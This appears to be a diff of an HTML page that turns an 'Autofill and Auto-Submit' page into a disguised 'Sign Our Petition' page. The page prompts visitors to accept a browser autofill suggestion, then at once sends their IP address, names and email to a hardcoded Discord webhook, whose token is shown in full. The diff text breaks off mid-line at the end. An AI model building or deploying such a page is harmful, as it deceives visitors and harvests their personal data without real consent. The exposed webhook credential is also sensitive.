@@ -3,30 +3,115 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Autofill and Auto-Submit</title>
+  <title>Sign Our Petition</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      color: #333;
+    }
+
+    .container {
+      max-width: 500px;
+      margin: 50px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    h1 {
+      margin-bottom: 15px;
+      font-size: 1.8em;
+      color: #222;
+    }
+
+    p {
+      margin-bottom: 20px;
+      font-size: 1em;
+      line-height: 1.5em;
+    }
+
+    #trigger {
+      display: inline-block;
+      padding: 10px 20px;
+      background: #4CAF50;
+      color: #fff;
+      font-size: 1em;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    #trigger:hover {
+      background: #45a049;
+    }
+
+    #formContainer {
+      margin-top: 20px;
+      text-align: left;
+    }
+
+    label {
+      display: inline-block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 8px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1em;
+    }
+
+    input[type="text"]:focus, input[type="email"]:focus {
+      border-color: #4CAF50;
+      outline: none;
+    }
+
+    .instructions {
+      font-size: 0.9em;
+      margin-bottom: 15px;
+      background: #e7f5e7;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #cce7cc;
+      color: #333;
+    }
+  </style>
 </head>
 <body>
-  <h1>Retrieve Your Saved Info</h1>
-  <p id="trigger" style="cursor:pointer; color:blue; text-decoration:underline;">
-    Click here to show the form
-  </p>
+  <div class="container">
+    <h1>Sign Our Petition</h1>
+    <p>Join our cause by sharing your details. Your support helps us make a difference!</p>
+    <p>To get started, simply click the button below.</p>
+    <button id="trigger">Sign the Petition</button>
 
-  <div id="formContainer" style="display:none;">
-    <p>Click into one of the fields below and select your saved autofill suggestion. Once selected, the data will be sent automatically.</p>
-    <form id="userForm" autocomplete="on">
-      <label for="fname">First Name:</label>
-      <input type="text" id="fname" name="given-name" autocomplete="given-name" required><br><br>
+    <div id="formContainer" style="display:none;">
+      <p class="instructions">
+        Please click into a field below. If your browser has saved your details, 
+        it may suggest your info. Once you choose an autofill suggestion, we’ll submit it right away!
+      </p>
+      <form id="userForm" autocomplete="on">
+        <label for="fname">First Name:</label>
+        <input type="text" id="fname" name="given-name" autocomplete="given-name" required>
 
-      <label for="lname">Last Name:</label>
-      <input type="text" id="lname" name="family-name" autocomplete="family-name" required><br><br>
+        <label for="lname">Last Name:</label>
+        <input type="text" id="lname" name="family-name" autocomplete="family-name" required>
 
-      <label for="email">Email:</label>
-      <input type="email" id="email" name="email" autocomplete="email" required><br><br>
-    </form>
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" autocomplete="email" required>
+      </form>
+    </div>
   </div>
 
   <script>
-    // Provided Discord webhook
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1316507623830458530/AJs1HDBblw6pbV0MldGNLKA3pusxfwjPjFg1qKZ7qO3UcCLtkbTv5SIHvXTVS1FK9z58';
 
     const trigger = document.getElementById('trigger');
@@ -48,10 +133,9 @@
         .catch(err => console.error('Error fetching IP:', err));
     });
 
-    // Show the form when the user clicks the trigger text
+    // Show the form when the user clicks the trigger
     trigger.addEventListener('click', () => {
       formContainer.style.display = 'block';
-      // Focus the first field to encourage autofill suggestions
       fnameField.focus();
     });
 
@@ -59,40 +143,4 @@
       // If at least one field has a value, submit immediately
       if (fnameField.value.trim() !== '' || lnameField.value.trim() !== '' || emailField.value.trim() !== '') {
         submitForm(
-          fnameField.value.trim() || '[No First Name]',
-          lnameField.value.trim() || '[No Last Name]',
-          emailField.value.trim() || '[No Email]'
-        );
-      }
-    }
-
-    function submitForm(fname, lname, email) {
-      const message = `**Autofilled Submission:**\n**IP:** ${userIP}\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
-
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: message })
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log('Message sent to Discord successfully!');
-        } else {
-          console.error('Failed to send message to Discord:', response.status, response.statusText);
-        }
-      })
-      .catch(err => console.error('Error sending message to Discord:', err));
-    }
-
-    // Listen for input and change events on all fields.
-    // Once a field is populated (likely via autofill selection), we submit immediately.
-    fnameField.addEventListener('input', checkFields);
-    lnameField.addEventListener('input', checkFields);
-    emailField.addEventListener('input', checkFields);
-
-    fnameField.addEventListener('change', checkFields);
-    lnameField.addEventListener('change', checkFields);
-    emailField.addEventListener('change', checkFields);
-  </script>
-</body>
-</html>
+          fnameField.val
